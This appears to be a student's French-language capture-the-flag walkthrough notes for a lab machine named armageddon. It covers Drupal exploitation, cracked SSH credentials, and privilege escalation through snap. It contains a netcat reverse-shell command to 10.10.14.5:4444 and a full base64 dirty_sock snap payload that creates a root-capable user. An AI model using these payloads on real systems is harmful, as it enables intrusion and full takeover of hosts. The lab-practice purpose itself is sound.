http://10.129.228.222

Drupal -> shell

trouver mysql : /var/www/html/sites/default/settings.php  !!!!! j'arrive pas a arriver sur ce repertoire


trouver hash

crack

trouver user :  
	brucetherealadmin  -  booboo

connexion ssh : 
	user.txt
	667bXXXXXXXXXXXXXXXXXxf

Excalade /
	sudo -l
		Snap est utilisable
		on va sur https://gtfobins.github.io/gtfobins

		on trouve :
		sur notre machine :
			COMMAND="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f"
			cd $(mktemp -d)
			mkdir -p meta/hooks
			printf '#!/bin/sh\n%s; false' "" >meta/hooks/install
			chmod +x meta/hooks/install
			fpm -n toto -s dir -t snap -a all meta

		machine distante :
			sudo snap install toto_1.0_all.snap --dangerous --devmode

			!!!!!!!!!!!!!!!! ca marche pas je sais pas pk
			!!!! je cherche un autre exploit :

----->
python2 -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A"*4256 + "=="' | base64 -d > dedsec.snap

[brucetherealadmin@armageddon tmp]$ ls
	dedsec.snap
[brucetherealadmin@armageddon tmp]$ sudo /usr/bin/snap install --devmode dedsec.snap 
	dirty-sock 0.1 installed
[brucetherealadmin@armageddon tmp]$ su dirty_sock
	Password: dirty_sock
[dirty_sock@armageddon tmp]$ sudo -i
	[sudo] password for dirty_sock: dirty_sock


	On créé le fichier snap
	on le DL
	et on le lance
	root.txt -   16cXXXXXXXXXXXXXXXXXXXXXXXXXX46
